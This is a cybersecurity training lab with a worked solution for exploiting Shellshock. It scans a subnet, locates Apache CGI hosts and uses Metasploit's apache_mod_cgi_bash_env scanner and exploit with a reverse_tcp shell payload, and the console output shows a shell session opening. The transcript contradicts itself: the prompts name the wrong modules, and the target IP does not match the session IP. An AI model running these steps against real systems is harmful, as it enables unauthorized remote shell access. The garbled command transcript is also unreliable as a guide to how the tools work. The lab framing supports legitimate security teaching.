# Shellshock Exploitation


## Instructions
- Launch the [Linux Exploitation](https://cybrscore.learnondemand.net/Lab/28535) lab.
- Scan your subnet for live hosts. Identify the host(s) running an Apache HTTP server.
- Use Metasploit to `search` for Metasploit modules related to Shellshock.
- Use Metasploit to scan live hosts for the Shellshock vulnerability.
  - **Hint**: Check the `/cgi-bin/status.cgi` endpoint. Look for a `auxiliary` module.
- Attempt to exploit the server with the modules related to Apache. Record which one works.

## Solutions
- Launch the [Linux Exploitation](https://cybrscore.learnondemand.net/Lab/28535) lab.

- Open a terminal, and launch `msfconsole`.

- Identify your IP address and netmask with: `ifconfig`

- Scan your subnet with: `db_nmap 10.0.0.0/24`

- Identify Apache servers on `10.0.0.100` and `10.0.0.101`.

- Use Nmap to scan each of these hosts for Shellshock. 

- Search for Shellshock modules. You'll identify two related to Apache: `auxiliary/scanner/http/apache_mod_cgi_bash_env` and `exploit/multi/http/apache_mod_cgi_bash_env_exec`.
  - The scanner is used to test for the vulnerability.
  - The exploit actually exploits the vulnerability.


  ```bash
  msf> search shellshock

  Matching Modules
  ================
  
     Name                                               Disclosure Date  Rank       Description
     ----                                               ---------------  ----       -----------
     auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
     auxiliary/server/dhclient_bash_env                 2014-09-24       normal     DHCP Client Bash Environment Variable Code Injection (Shellshock)
     exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Advantech Switch Bash Environment Variable Code Injection (Shellshock)
     exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  IPFire Bash Environment Variable Injection (Shellshock)
     exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
     exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
     exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  CUPS Filter Bash Environment Variable Code Injection (Shellshock)
     exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Legend Perl IRC Bot Remote Code Execution
     exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
     exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
     exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  Dhclient Bash Environment Variable Injection (Shellshock)
     exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     Qmail SMTP Bash Environment Variable Injection (Shellshock)
  ```

- Load and use the scanner. You'll see that the target is vulnerable.

  ```bash
  msf > use auxiliary/scanner/http/apache_mod_cgi_bash_env
  msf auxiliary(multi/http/apache_mod_cgi_bash_env_exec) > SET RHOST 10.0.0.100
  msf auxiliary(multi/http/apache_mod_cgi_bash_env_exec) > SET TARGETURI /cgi-bin/status.cgi
  msf auxiliary(multi/http/apache_mod_cgi_bash_env_exec) > exploit
  ```

- Load and use the exploit. You'll be greeted with a reverse shell.

  ```bash
  msf auxiliary(multi/http/apache_mod_cgi_bash_env_exec) > use exploit/multi/http/apache_mod_cgi_bash_env

  msf exploit(multi/http/apache_mod_cgi_bash_env) > SET RHOST 10.0.0.100

  msf exploit(multi/http/apache_mod_cgi_bash_env) > SET TARGETURI /cgi-bin/status.cgi

  msf exploit(multi/http/apache_mod_cgi_bash_env) > SET PAYLOAD linux/x86/shell/reverse_tcp

  msf exploit(multi/http/apache_mod_cgi_bash_env) > check
    [*] 10.0.0.100:80 The target is vulnerable.

  msf exploit(multi/http/apache_mod_cgi_bash_env) > exploit
    [*] Started reverse TCP handler on 172.16.1.100:4444
    [*] Command Stager progress - 100.46% done (1097/1092 bytes)
    [*] Sending stage (36 bytes) to 172.16.1.102
    [*] Command shell session 2 opened (172.16.1.100:4444 -> 172.16.1.102:49499)
  ```

- Take a moment to address remaining questions before proceeding.
